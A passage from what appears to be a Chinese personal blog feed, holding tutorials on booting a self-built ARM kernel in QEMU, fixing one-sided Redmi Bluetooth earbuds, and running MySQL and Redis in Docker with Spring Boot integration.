"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2461/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvYnZTb1R0T0VuZ1BobTdKLnBuZw.png" alt="image-20200607234356567"></p><p>在“_install/etc”目录创建“fstab”文件，并写入以下内容：  </p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proc /proc proc defaults 0 0</span><br><span class="line">tmpfs /tmp tmpfs defaults 0 0</span><br><span class="line">sysfs /sys sysfs defaults 0 0</span><br><span class="line">tempfs /dev tmpfs defaults 0 0</span><br><span class="line">debugfs /sys/kernel/debug debugfs defaults 0 0  </span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2461/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvOFNVTlBqbFl6aWhWREJBLnBuZw.png" alt="image-20200607234653102"></p><p>在“_install/etc”目录创建“inittab”文件，并写入以下内容：  </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line">::respawn:-/bin/sh</span><br><span class="line">::askfirst:-/bin/sh</span><br><span class="line">::ctrlaltdel:/bin/umount -a -r  </span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2461/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvS3ZOcGJaaUNUT1dxSHRhLnBuZw.png" alt="image-20200607234926195"></p><p>在“_install/dev”目录中创建如下设备节点。 ：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mknod</span> console c 5 1</span><br><span class="line"><span class="built_in">mknod</span> null c 1 3  </span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2461/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvNzV6aU04YUxyU0QyZXV2LnBuZw.png" alt="image-20200607235200236"></p><p>完成上述设置后，在内核目录中编译内核 ：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> ARCH=arm</span><br><span class="line"><span class="built_in">export</span> CROSS_COMPILE=arm-linux-gnueabi-</span><br><span class="line">make vexpress_defconfig</span><br><span class="line">make menuconfig  </span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2461/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvdWJsUmNaVDlxVmZFRjROLnBuZw.png" alt="image-20200607235445654"></p><blockquote><p>make menuconfig 设置中，按照以下路径，在 initramfs source file 中填入“_install”(按回车填入) :<br>General setup —-&gt;<br>　　　　　　 [*]Initial RAM filesystem and RAM disk (initramfs/initrd) support<br>　　　　　　　　　　　(_install)Initramfs source file(s)  </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2461/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvYXN3NkpOT3hISUVvbWJqLnBuZw.png" alt="image-20200607235912353"></p><p>返回上一层，在</p><p>Boot option  —-&gt;<br>　　　　()Default kernel command string  </p><p>回车进入 Default kernel command string 并清 空 。 下 图 中 删 除 原 有 内 容 用<br>Ctl+Backspace 键。  </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2461/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvT0FGN3UyRWhLQ1dVWTZWLnBuZw.png" alt="image-20200608000442154"></p><p>配置 memory split 为“3G/1G user/kernel split”,并打开High Memory Support：</p><p>Kernel features —-&gt;<br>　　　　Memory split(3G/1G user/kernel split) -<br>　　　　[*] High Memory Support  </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2461/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgveGRBTERNSUd5c2lyTmE2LnBuZw.png" alt="image-20200608000716572"></p></blockquote><p>在内核目录下编译内核(此步骤时间较长)  </p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make bzImage ARCH=arm CROSS_COMPILE=arm-linux-gnueabi-</span><br><span class="line">make dtbs </span><br></pre></td></tr></tbody></table></figure><blockquote><p>可能会出现“./usr/gen_initramfs_list.sh: 131: local: 1: bad variable name”的错误，原因是以前用的bash执行而现在使用sh。</p><p>解决办法：131行改为 ：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">local dev="`LC_ALL=C ls -l "${location}"`"</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2461/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvcllBbTQ1blJNOUtVdXBaLnBuZw.png" alt="image-20200608093024179"></p></blockquote><p>编译完成后会有如下提示，并显示编译后内核的存储路径。 </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2461/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvd3NTNkJ1eVV6ckdaZVEyLnBuZw.png" alt="image-20200608003409578"></p></li><li><h5 id="运行-QEMU"><a href="#运行-QEMU" class="headerlink" title="运行 QEMU"></a>运行 QEMU</h5><p>如下所示，输入 QEMU 启动命令，成功启动 QEMU，注意需指定 bzImage路径，并注意使用当前命令与 bzImage 路径的关系。  </p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-arm -M vexpress-a9 -m 256M -kernel <span class="built_in">arch</span>/arm/boot/zImage -append <span class="string">"rdinit=/linuxrc console=ttyAMA0 loglevel=8"</span> -dtb <span class="built_in">arch</span>/arm/boot/dts/vexpress-v2p-ca9.dtb -nographic  </span><br></pre></td></tr></tbody></table></figure><blockquote><p>以上命令中参数含义如下；<br>-M：指定硬件芯片框架<br>-m：指定运行内存大小<br>-kernel：指定运行的内核镜像<br>-dtb：指定具体芯片的配置信息<br>-nographic：指定不使用图形界面  </p></blockquote></li><li><h5 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h5><p>如下图可以看到，成功运行了我们刚刚编译的新内核</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2461/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvNVZ0cHkyUkRrSlNUWmRoLnBuZw.png" alt="image-20200608004409477"></p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Cpp </tag>
            
            <tag> Linux </tag>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>亲测：解决红米蓝牙耳机只有一边有声音的问题</title>
      <link href="/posts/56389/"/>
      <url>/posts/56389/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前言：之前耳机出问题一直在网上找答案，网上的答案有漏的地方，所以一直失败，所以把我的方案写下来记录一下。</p></blockquote><p>1.手机上取消和耳机的配对</p><p>2.在开机状态将两只耳机长按5秒关机，关机后松开（关机的时候两只耳机灯都不亮，如果本身就是关机状态就不用）</p><p>3.长按两只耳机，闪白灯，继续按，然后出现一次红白灯闪，不要放手继续按住，直到再出现一次红白灯闪（这很重要）。这是清除配置信息、 手机上记得选择取消配对并关闭蓝牙。</p><p>4.先将右耳机开机再将左耳机开机。（一定要放到盒子里，在盒子里拿出来会自动开机，所以只用先把右耳机拿出来）</p><p>5.这时候右耳机快闪，当左耳机不闪的时候左右耳机就配对成功了。</p><p>6.进入手机蓝牙设置，这时候应该可以连接了</p>]]></content>
      
      
      
        <tags>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker中安装mysql</title>
      <link href="/posts/15098/"/>
      <url>/posts/15098/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker-安装-MySQL"><a href="#Docker-安装-MySQL" class="headerlink" title="Docker 安装 MySQL"></a>Docker 安装 MySQL</h1><p>MySQL 是世界上最受欢迎的开源数据库。凭借其可靠性、易用性和性能，MySQL 已成为 Web 应用程序的数据库优先选择。</p><h3 id="1、查看可用的-MySQL-版本"><a href="#1、查看可用的-MySQL-版本" class="headerlink" title="1、查看可用的 MySQL 版本"></a>1、查看可用的 MySQL 版本</h3><p>访问 MySQL 镜像库地址：<a href="https://hub.docker.com/_/mysql?tab=tags">https://hub.docker.com/_/mysql?tab=tags</a> 。</p><p>可以通过 Sort by 查看其他版本的 MySQL，默认是最新版本 <strong>mysql:latest</strong> 。</p><p><a href="https://www.runoob.com/wp-content/uploads/2016/06/docker-mysql1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/15098/docker-mysql1.png" alt="img"></a></p><p>你也可以在下拉列表中找到其他你想要的版本：</p><p><a href="https://www.runoob.com/wp-content/uploads/2016/06/docker-mysql2.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/15098/docker-mysql2.png" alt="img"></a></p><p>此外，我们还可以用  docker search mysql 命令来查看可用版本：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ docker search mysql</span><br><span class="line">NAME                     DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED</span><br><span class="line">mysql                    MySQL is a widely used, open-source relati...   2529      [OK]       </span><br><span class="line">mysql/mysql-server       Optimized MySQL Server Docker images. Crea...   161                  [OK]</span><br><span class="line">centurylink/mysql        Image containing mysql. Optimized to be li...   45                   [OK]</span><br><span class="line">sameersbn/mysql                                                          36                   [OK]</span><br><span class="line">google/mysql             MySQL server for Google Compute Engine          16                   [OK]</span><br><span class="line">appcontainers/mysql      Centos/Debian Based Customizable MySQL Con...   8                    [OK]</span><br><span class="line">marvambass/mysql         MySQL Server based on Ubuntu 14.04              6                    [OK]</span><br><span class="line">drupaldocker/mysql       MySQL for Drupal                                2                    [OK]</span><br><span class="line">azukiapp/mysql           Docker image to run MySQL by Azuki - http:...   2                    [OK]</span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure><h3 id="2、拉取-MySQL-镜像"><a href="#2、拉取-MySQL-镜像" class="headerlink" title="2、拉取 MySQL 镜像"></a>2、拉取 MySQL 镜像</h3><p>这里我们拉取官方的最新版本的镜像：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker pull mysql:latest</span><br></pre></td></tr></tbody></table></figure><p><a href="https://www.runoob.com/wp-content/uploads/2016/06/docker-mysql3.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/15098/docker-mysql3.png" alt="img"></a></p><h3 id="3、查看本地镜像"><a href="#3、查看本地镜像" class="headerlink" title="3、查看本地镜像"></a>3、查看本地镜像</h3><p>使用以下命令来查看是否已安装了 mysql：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker images</span><br></pre></td></tr></tbody></table></figure><p><a href="https://www.runoob.com/wp-content/uploads/2016/06/docker-mysql6.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/15098/docker-mysql6.png" alt="img"></a></p><p>在上图中可以看到我们已经安装了最新版本（latest）的 mysql 镜像。</p><h3 id="4、运行容器"><a href="#4、运行容器" class="headerlink" title="4、运行容器"></a>4、运行容器</h3><p>安装完成后，我们可以使用以下命令来运行 mysql 容器：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -itd --name mysql-latest-test -p 3306:3306 -e MYSQL_ROOT_PASSWORD=czqu123456 mysql</span><br></pre></td></tr></tbody></table></figure><p>参数说明：</p><ul><li><strong>-p 3306:3306</strong> ：映射容器服务的 3306 端口到宿主机的 3306 端口，外部主机可以直接通过 宿主机ip:3306 访问到 MySQL 的服务。</li><li><strong>MYSQL_ROOT_PASSWORD=123456</strong>：设置 MySQL 服务 root 用户的密码。</li></ul><p><a href="https://www.runoob.com/wp-content/uploads/2016/06/docker-mysql4.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/15098/docker-mysql4.png" alt="img"></a></p><h3 id="5、安装成功"><a href="#5、安装成功" class="headerlink" title="5、安装成功"></a>5、安装成功</h3><p>通过 docker ps 命令查看是否安装成功：</p><p><a href="https://www.runoob.com/wp-content/uploads/2016/06/docker-mysql5.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/15098/docker-mysql5.png" alt="img"></a></p><p>本机可以通过 root 和密码 123456 访问 MySQL 服务。</p><p><a href="https://www.runoob.com/wp-content/uploads/2016/06/docker-mysql7.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/15098/docker-mysql7.png" alt="img"></a></p><p>​            </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>redis整合springboot</title>
      <link href="/posts/9380/"/>
      <url>/posts/9380/</url>
      
        <content type="html"><![CDATA[<h2 id="Docker-安装-Redis"><a href="#Docker-安装-Redis" class="headerlink" title="Docker 安装 Redis"></a>Docker 安装 Redis</h2><p>Redis 是一个开源的使用 ANSI C 语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value 的 NoSQL 数据库，并提供多种语言的 API。</p><h3 id="1、查看可用的-Redis-版本"><a href="#1、查看可用的-Redis-版本" class="headerlink" title="1、查看可用的 Redis 版本"></a>1、查看可用的 Redis 版本</h3><p>访问 Redis 镜像库地址： <a href="https://hub.docker.com/_/redis?tab=tags%E3%80%82">https://hub.docker.com/_/redis?tab=tags。</a></p><p>可以通过 Sort by 查看其他版本的 Redis，默认是最新版本 <strong>redis:latest</strong>。</p><p><a href="https://www.runoob.com/wp-content/uploads/2016/06/docker-redis1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/9380/docker-redis1.png" alt="img"></a></p><p>你也可以在下拉列表中找到其他你想要的版本：</p><p><a href="https://www.runoob.com/wp-content/uploads/2016/06/docker-redis2.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/9380/docker-redis2.png" alt="img"></a></p><p>此外，我们还可以用  docker search redis 命令来查看可用版本：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ docker search  redis</span><br><span class="line">NAME                      DESCRIPTION                   STARS  OFFICIAL  AUTOMATED</span><br><span class="line">redis                     Redis is an open source ...   2321   [OK]       </span><br><span class="line">sameersbn/redis                                         32                   [OK]</span><br><span class="line">torusware/speedus-redis   Always updated official ...   29             [OK]</span><br><span class="line">bitnami/redis             Bitnami Redis Docker Image    22                   [OK]</span><br><span class="line">anapsix/redis             11MB Redis server image ...   6                    [OK]</span><br><span class="line">webhippie/redis           Docker images for redis       4                    [OK]</span><br><span class="line">clue/redis-benchmark      A minimal docker image t...   3                    [OK]</span><br><span class="line">williamyeh/redis          Redis image for Docker        3                    [OK]</span><br><span class="line">unblibraries/redis        Leverages phusion/baseim...   2                    [OK]</span><br><span class="line">greytip/redis             redis 3.0.3                   1                    [OK]</span><br><span class="line">servivum/redis            Redis Docker Image            1                    [OK]</span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure><h3 id="2、取最新版的-Redis-镜像"><a href="#2、取最新版的-Redis-镜像" class="headerlink" title="2、取最新版的 Redis 镜像"></a>2、取最新版的 Redis 镜像</h3><p>这里我们拉取官方的最新版本的镜像：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker pull redis:latest</span><br></pre></td></tr></tbody></table></figure><p><a href="https://www.runoob.com/wp-content/uploads/2016/06/docker-redis3.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/9380/docker-redis3.png" alt="img"></a></p><blockquote><p>针对Docker客户端版本大于 1.10.0 的用户</p><p>你可以通过修改daemon配置文件/etc/docker/daemon.json来使用加速器</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-'EOF'</span><br><span class="line">{</span><br><span class="line">  "registry-mirrors": ["https://r46f0phk.mirror.aliyuncs.com"]</span><br><span class="line">}</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></tbody></table></figure></blockquote><h3 id="3、查看本地镜像"><a href="#3、查看本地镜像" class="headerlink" title="3、查看本地镜像"></a>3、查看本地镜像</h3><p>使用以下命令来查看是否已安装了 redis：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker images</span><br></pre></td></tr></tbody></table></figure><p><a href="https://www.runoob.com/wp-content/uploads/2016/06/docker-redis4.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/9380/docker-redis4.png" alt="img"></a></p><p>在上图中可以看到我们已经安装了最新版本（latest）的 redis 镜像。</p><h3 id="4、运行容器"><a href="#4、运行容器" class="headerlink" title="4、运行容器"></a>4、运行容器</h3><p>安装完成后，我们可以使用以下命令来运行 redis 容器：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -itd --name redis-test -p 6379:6379 redis --requirepass "czqu@123"</span><br></pre></td></tr></tbody></table></figure><p>参数说明：</p><ul><li><strong>-p 6379:6379</strong>：映射容器服务的 6379 端口到宿主机的 6379 端口。外部可以直接通过宿主机ip:6379 访问到 Redis 的服务。</li><li>–requirepasss 设置密码</li></ul><p><a href="https://www.runoob.com/wp-content/uploads/2016/06/docker-redis5.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/9380/docker-redis5.png" alt="img"></a></p><blockquote><p>docker容器设置开机自启动：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--restart具体参数值详细信息``no - 容器退出时，不重启容器``on-failure - 只有在非0状态退出时才从新启动容器``always - 无论退出状态是如何，都重启容器</span><br></pre></td></tr></tbody></table></figure><p>　　还可以在使用 on-failure 策略时，指定 Docker 将尝试重新启动容器的最大次数；默认情况下，Docker 将尝试永远重新启动容器；</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --restart=on-failure:10 redis</span><br></pre></td></tr></tbody></table></figure><p>　　</p><p>　　如果创建时未指定 –restart=always ,可通过 update 命令更改；</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker update --restart=always 容器ID</span><br></pre></td></tr></tbody></table></figure></blockquote><h3 id="5、安装成功"><a href="#5、安装成功" class="headerlink" title="5、安装成功"></a>5、安装成功</h3><p>最后我们可以通过 <strong>docker ps</strong> 命令查看容器的运行信息：</p><p><a href="https://www.runoob.com/wp-content/uploads/2016/06/docker-redis6.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/9380/docker-redis6.png" alt="img"></a></p><p>接着我们通过 redis-cli 连接测试使用 redis 服务。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker exec -it redis-test /bin/bash</span><br></pre></td></tr></tbody></table></figure><p><a href="https://www.runoob.com/wp-content/uploads/2016/06/docker-redis7.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/9380/docker-redis7.png" alt="img"></a></p><p>​            </p><h2 id="整合springboot"><a href="#整合springboot" class="headerlink" title="整合springboot"></a>整合springboot</h2><h3 id="1-引入依赖"><a href="#1-引入依赖" class="headerlink" title="1.引入依赖"></a>1.引入依赖</h3><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cc.czqu<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>redis-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>redis-test<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Demo project for Spring Boot<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>11<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.lettuce<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lettuce-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span 